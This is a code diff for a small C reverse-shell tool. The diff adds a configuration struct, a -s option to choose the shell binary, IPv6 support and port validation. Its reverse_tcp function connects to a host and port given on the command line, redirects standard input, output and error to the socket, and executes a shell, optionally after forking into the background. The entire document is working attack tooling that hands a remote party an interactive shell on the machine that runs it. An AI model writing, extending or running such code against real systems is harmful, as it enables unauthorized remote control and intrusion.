@@ -13,17 +13,46 @@
 #define PATHSHELL	PATH "/" SHELL
 
 
+#define RSHELL_F_NOFORK	(1 << 0)
+
+struct rshell
+{
+	char		*host;
+	char		*service;
+	uint16_t	port;
+	int		family;
+	char		*shell;
+	unsigned	flags;
+};
+
+
 static void usage()
 {
 	fprintf(stderr, "usage: %s [options] <host> <port>\n", PROGNAME);
 	fprintf(stderr, "options:\n");
-	fprintf(stderr, "\t-h : display this and exit\n");
-	fprintf(stderr, "\t-f : foreground mode (eg: no fork)\n");
-	fprintf(stderr, "\t-6 : use IPv6 socket\n");
+	fprintf(stderr, "\t-h         : display this and exit\n");
+	fprintf(stderr, "\t-f         : foreground mode (eg: no fork)\n");
+	fprintf(stderr, "\t-6         : use IPv6 socket\n");
+	fprintf(stderr, "\t-s <shell> : give the path shell (default: %s)\n", PATHSHELL);
 }
 
 
-static void reverse_tcp(const char *host, const char *port, int family)
+static char *rshell_basename(char *path)
+{
+	char		*ptr;
+	size_t		len = strlen(path);
+
+	for ( ptr = path + len ; ptr >= path ; ptr--)
+	{
+		if ( ptr[0] == '/' )
+			return ++ptr;
+	}
+
+	return path;
+}
+
+
+static void reverse_tcp(const struct rshell *rshell)
 {
 	int		sockfd;
 	struct addrinfo	hints;
@@ -32,10 +61,10 @@ static void reverse_tcp(const char *host, const char *port, int family)
 	char		*ex[3];
 
 	memset(&hints, 0, sizeof hints);
-	hints.ai_family = AF_INET;
+	hints.ai_family = rshell->family;
 	hints.ai_socktype = SOCK_STREAM;
 
-	if ( (ret = getaddrinfo(host, port, &hints, &res)) != 0 )
+	if ( (ret = getaddrinfo(rshell->host, rshell->service, &hints, &res)) != 0 )
 		return;
 
 	if ( (sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) < 0 )
@@ -50,8 +79,8 @@ static void reverse_tcp(const char *host, const char *port, int family)
 	dup2(sockfd, 1);
 	dup2(sockfd, 2);
 
-	ex[0] = PATHSHELL;
-	ex[1] = SHELL;
+	ex[0] = rshell->shell;
+	ex[1] = rshell_basename(rshell->shell);
 	ex[2] = NULL;
 
 	execve(ex[0], &ex[1], NULL);
@@ -61,14 +90,39 @@ static void reverse_tcp(const char *host, const char *port, int family)
 }
 
 
+static void rshell_init(struct rshell *rshell)
+{
+	rshell->family = AF_INET;
+	rshell->shell = PATHSHELL;
+	rshell->flags = 0;
+}
+
+
+static int rshell_set_port(struct rshell *rshell, char *port)
+{
+	long int	res;
+
+	res = strtol(port, NULL, 10);
+
+	if ( res <= 0 || res > 0xffff )
+		return -1;
+
+	rshell->service = port;
+	rshell->port = (uint16_t) res;
+
+	return 0;
+}
+
+
 int main(int argc, char *argv[])
 {
-	int	c;
-	int	nofork = 0;
-	pid_t	child;
-	int		family = AF_INET;
+	int		c;
+	pid_t		child;
+	struct rshell	rshell;
 
-	while ( (c = getopt(argc, argv, "hf6")) != -1 )
+	rshell_init(&rshell);
+
+	while ( (c = getopt(argc, argv, "hf6s:")) != -1 )
 	{
 		switch ( c )
 		{
@@ -77,11 +131,15 @@ int main(int argc, char *argv[])
 			return 0;
 
 			case 'f':
-			nofork = 1;
+			rshell.flags |= RSHELL_F_NOFORK;
 			break;
 
 			case '6':
-			family = AF_INET6;
+			rshell.family = AF_INET6;
+			break;
+
+			case 's':
+			rshell.shell = optarg;
 			break;
 		}
 	}
@@ -95,10 +153,17 @@ int main(int argc, char *argv[])
 		return -1;
 	}
 
+	rshell.host = argv[0];
+	if ( rshell_set_port(&rshell, argv[1]) )
+	{
+		fprintf(stderr, "Invalid port %s\n", argv[1]);
+		return -1;
+	}
+
 	/* Fork and connect back
 	 */
-	if ( nofork || (child = fork()) == 0 )
-		reverse_tcp(argv[0], argv[1], family);
+	if ( (rshell.flags & RSHELL_F_NOFORK) || (child = fork()) == 0 )
+		reverse_tcp(&rshell);
 	else
 		printf("child pid: %d\n", child);
 
